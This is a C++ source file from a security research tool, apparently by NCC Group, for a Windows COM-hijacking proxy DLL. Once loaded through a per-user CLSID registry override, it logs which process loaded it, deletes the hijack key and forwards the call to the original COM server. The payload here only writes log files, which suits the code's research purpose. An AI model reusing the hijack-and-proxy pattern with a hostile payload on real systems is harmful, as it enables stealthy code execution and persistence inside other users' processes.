// Copyright (c) 2019, NCC Group. All rights reserved.
// Licensed under BSD 3-Clause License per LICENSE file

#include "stdafx.h"
#include <Windows.h>
#include <comutil.h> // #include for _bstr_t
#include <string>
#include <tlhelp32.h>
#include <stdio.h>
#include <strsafe.h>
#include <sstream>      // std::istringstream, std::ws


BOOL FindOriginalCOMServer(wchar_t* GUID, wchar_t* DLLName);
DWORD WINAPI RevertHijack(LPOLESTR lplpsz);
DWORD MyThread();
DWORD getpid();
DWORD getppid();
HANDLE hClassObjThread; //handle to thread started from DllGetClassObject
typedef HRESULT(__stdcall *_DllGetClassObject)(REFCLSID rclsid, REFIID riid, LPVOID* ppv);
LPOLESTR lplpsz;		//GUID, set in DllGetClassObject
char szFileName[MAX_PATH];
UINT g_uThreadFinished;
extern UINT g_uThreadFinished;
HMODULE hCurrent;

//for debugging
std::string GetLastErrorAsString()
{
	//Get the error message, if any.
	DWORD errorMessageID = ::GetLastError();
	if (errorMessageID == 0)
		return std::string(); //No error message has been recorded

	LPSTR messageBuffer = nullptr;
	size_t size = FormatMessageA(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
		NULL, errorMessageID, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), (LPSTR)&messageBuffer, 0, NULL);

	std::string message(messageBuffer, size);

	//Free the buffer.
	LocalFree(messageBuffer);

	return message;
}

//writes some data to a file
//i chose writing to a file because doing stuff like AllocConsole when inside certain processes will crash it
//if somebody has a more elegant solution, please open issue/PR :)
DWORD WINAPI LogThreadActivity(std::wstring fileName) {
	printf("[+] MyThread\n\n");
	DWORD pid = getpid();
	DWORD ppid = getppid();

	HANDLE hFile = NULL;
	hFile = CreateFile(fileName.c_str(),	// name of the file
		GENERIC_WRITE,						// open for writing
		0,									// do not share
		NULL,								// default security
		CREATE_ALWAYS,						// create new file only
		FILE_ATTRIBUTE_NORMAL,				// normal file
		NULL);								// no attr. template
	if (hFile == INVALID_HANDLE_VALUE)
	{
		printf("Terminal failure: Unable to open file for write.\n");
	}
	CloseHandle(hFile);

	//in a loop, write a number to the log file

	for (int i = 0; i < 15; i++)
	{
		hFile = CreateFile(fileName.c_str(),	// name of the file
			FILE_APPEND_DATA,					// append data
			0,									// do not share
			NULL,								// default security
			OPEN_EXISTING,						// open existing file
			FILE_ATTRIBUTE_NORMAL,				// normal file
			NULL);								// no template

		DWORD bytesWritten;
		std::string path = szFileName;
		path = path.substr(path.find_last_of("/\\") + 1);
		size_t dot_i = path.find_last_of('.');
		std::string exeName = path.substr(0, dot_i);



		std::ostringstream bufferStm;
		bufferStm << "[*] " << exeName << " pid=" << pid << " ppid=" << ppid << " (count " << i << ")\n";
		std::string buffer  = bufferStm.str();

		if (hFile) {
			WriteFile(hFile, buffer.data(), buffer.length(), &bytesWritten, NULL);
		}
		else {
			printf("Terminal failure: Unable to open file  for write.\n");
		}
		CloseHandle(hFile);
		Sleep(1000);
	}

	g_uThreadFinished = 1;

	return 0;
}

DWORD WINAPI ClassObjThread(LPVOID lpParam)
{
	//get GUID set when DllGetClassObject was called
	std::wstring guid = lplpsz;
	//remove { and } from GUID
	guid.erase(0, 1);
	guid.erase(guid.size() - 1);
	// convert thread handle to string
	std::wostringstream str;
	str << hClassObjThread;
	std::wstring threadHandleStr = str.str();
	//unique file to track progress of thread
	std::wstring fileName = L"C:\\COM\\logGetClassObjThread-" + threadHandleStr + L"-" + guid + L".txt";
	LogThreadActivity(fileName);
	return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved
)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
	{
		hCurrent = hModule;
		//get the name of the DLL thats being loaded from the handle
		GetModuleFileNameA(NULL, szFileName, MAX_PATH);

		g_uThreadFinished = 0;

		break;
	}
	case DLL_PROCESS_DETACH:
		printf("[*] DLL_PROCESS_DETACH\n");
		break;
	}
	return TRUE;
}

STDAPI DllCanUnloadNow(void)
{
	wprintf(L"[+] DllCanUnloadNow\n");
	// Ensure our thread can finish before we're unloaded
	do
	{
		Sleep(1);
	} while (g_uThreadFinished == 0);

	wprintf(L"[+] All done, exiting.\n");
	return S_OK;
}
STDAPI DllRegisterServer(void)
{
	wprintf(L"[+] DllRegisterServer\n");
	return S_OK;
}
STDAPI DllUnregisterServer(void)
{
	wprintf(L"[+] DllUnregisterServer\n");
	return S_OK;
}



STDAPI DllGetClassObject(REFCLSID rclsid, REFIID riid, LPVOID* ppv)
{
	wprintf(L"[+] DllGetClassObject\n");
	//start our thread
	//this program has not been made thread safe, and you should expect this function to be called a lot by the same COM client
	hClassObjThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ClassObjThread, NULL, 0, NULL);
	HMODULE hDLL;
	_DllGetClassObject lpGetClassObject;


	HRESULT hResult = StringFromCLSID(rclsid, &lplpsz);
	wchar_t* DLLName = new wchar_t[MAX_PATH];

	//clean up after ourselves by deleting the registry key
	bool result = RevertHijack(lplpsz);
	if (result) {
		wprintf(L"[+] Done! Hijack reverted\n");
	}
	else {
		wprintf(L"[+] Hijack was unable to be reverted\n");
	}

	if (!FindOriginalCOMServer((wchar_t*)lplpsz, DLLName))
	{
		wprintf(L"[-] Couldn't find original COM server\n");
		return S_FALSE;
	}

	wprintf(L"[+] Found original COM server: %s\n", &DLLName);

	// Load up the original COM server
	hDLL = LoadLibrary(DLLName);
	if (hDLL == NULL)
	{
		wprintf(L"[-] hDLL was NULL\n");
		return S_FALSE;
	}

	// Find the DllGetClassObject for original COM server
	lpGetClassObject = (_DllGetClassObject)GetProcAddress(hDLL, "DllGetClassObject");
	if (lpGetClassObject == NULL)
	{
		wprintf(L"[-] lpGetClassObject is null\n");
		return S_FALSE;
	}

	// Call the intended DllGetClassObject from original COM server
	// This will get all the necessary pointers and should be all set if successful
	HRESULT hr = lpGetClassObject(rclsid, riid, ppv);
	if FAILED(hr)
	{
		wprintf(L"[-] lpGetClassObject got hr 0x%08lx\n", hr);
	}


	return S_OK;
}

// from COMproxy POC
BOOL FindOriginalCOMServer(wchar_t* GUID, wchar_t* DLLName)
{
	HKEY hKey;
	HKEY hCLSIDKey;
	DWORD nameLength = MAX_PATH;

	wprintf(L"[*] Beginning search for GUID %s\n", GUID);

	LONG lResult = RegOpenKeyExW(HKEY_LOCAL_MACHINE, (LPCWSTR)L"SOFTWARE\\Classes\\CLSID", 0, KEY_READ, &hKey);
	if (lResult != ERROR_SUCCESS) {
		wprintf(L"[-] Error getting CLSID path\n");
		return FALSE;
	}

	// Make sure HKLM\Software\Classes\CLSID\{GUID} exists
	lResult = RegOpenKeyExW(hKey, GUID, 0, KEY_READ, &hCLSIDKey);
	if (lResult != ERROR_SUCCESS) {
		wprintf(L"[-] Error getting GUID path\n");
		RegCloseKey(hKey);
		return FALSE;
	}

	// Read the value of HKLM's InProcServer32
	lResult = RegGetValueW(hCLSIDKey, (LPCWSTR)L"InProcServer32", NULL, RRF_RT_ANY, NULL, (PVOID)DLLName, &nameLength);
	if (lResult != ERROR_SUCCESS) {
		wprintf(L"[-] Error getting InProcServer32 value: %d\n", lResult);
		RegCloseKey(hKey);
		RegCloseKey(hCLSIDKey);
		return FALSE;
	}

	return TRUE;
}

DWORD getpid() {
	DWORD pid = GetCurrentProcessId();
	return pid;
}

DWORD getppid()
{
	HANDLE hSnapshot;
	PROCESSENTRY32 pe32;
	DWORD ppid = 0, pid = GetCurrentProcessId();

	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	__try {
		if (hSnapshot == INVALID_HANDLE_VALUE) __leave;

		ZeroMemory(&pe32, sizeof(pe32));
		pe32.dwSize = sizeof(pe32);
		if (!Process32First(hSnapshot, &pe32)) __leave;

		do {
			if (pe32.th32ProcessID == pid) {
				ppid = pe32.th32ParentProcessID;
				break;
			}
		} while (Process32Next(hSnapshot, &pe32));

	}
	__finally {
		if (hSnapshot != INVALID_HANDLE_VALUE) CloseHandle(hSnapshot);
	}
	return ppid;
}

BOOL RegDelnodeRecurse(HKEY hKeyRoot, LPWSTR lpSubKey)
{
	LPWSTR lpEnd;
	LONG lResult;
	DWORD dwSize;
	wchar_t szName[MAX_PATH];
	HKEY hKey;
	FILETIME ftWrite;

	// First, see if we can delete the key without having to recurse.

	lResult = RegDeleteKey(hKeyRoot, lpSubKey);
	if (lResult == ERROR_SUCCESS)
		return TRUE;
	lResult = RegOpenKeyEx(hKeyRoot, lpSubKey, 0, KEY_READ, &hKey);

	if (lResult != ERROR_SUCCESS)
	{
		if (lResult == ERROR_FILE_NOT_FOUND) {
			printf("Key not found.\n");
			return TRUE;
		}
		else {
			printf("Error opening key.\n");
			return FALSE;
		}
	}

	// Check for an ending slash and add one if it is missing.
	lpEnd = lpSubKey + lstrlen(lpSubKey);
	if (*(lpEnd - 1) != L'\\')
	{
		*lpEnd = L'\\';
		lpEnd++;
		*lpEnd = L'\0';
	}

	// Enumerate the keys
	dwSize = MAX_PATH;
	lResult = RegEnumKeyEx(hKey, 0, szName, &dwSize, NULL,
		NULL, NULL, &ftWrite);

	if (lResult == ERROR_SUCCESS)
	{
		do {
			*lpEnd = L'\0';
			StringCchCat(lpSubKey, MAX_PATH * 2, szName);
			if (!RegDelnodeRecurse(hKeyRoot, lpSubKey)) {
				break;
			}
			dwSize = MAX_PATH;
			lResult = RegEnumKeyEx(hKey, 0, szName, &dwSize, NULL,
				NULL, NULL, &ftWrite);
		} while (lResult == ERROR_SUCCESS);
	}

	lpEnd--;
	*lpEnd = L'\0';

	RegCloseKey(hKey);

	// Try again to delete the key.
	lResult = RegDeleteKey(hKeyRoot, lpSubKey);
	if (lResult == ERROR_SUCCESS)
		return TRUE;
	return FALSE;
}

BOOL RegDelnode(HKEY hKeyRoot, LPCWSTR lpSubKey)
{
	TCHAR szDelKey[MAX_PATH * 2];
	StringCchCopy(szDelKey, MAX_PATH * 2, lpSubKey);
	return RegDelnodeRecurse(hKeyRoot, szDelKey);
}

DWORD WINAPI RevertHijack(LPOLESTR lplpsz) {
	wchar_t* GUID = lplpsz;
	std::wstring basePath = L"Software\\Classes\\CLSID\\";
	std::wstring regKey = basePath + std::wstring(GUID);

	BOOL bSuccess;
	bSuccess = RegDelnode(HKEY_CURRENT_USER, regKey.c_str());
	return bSuccess;
}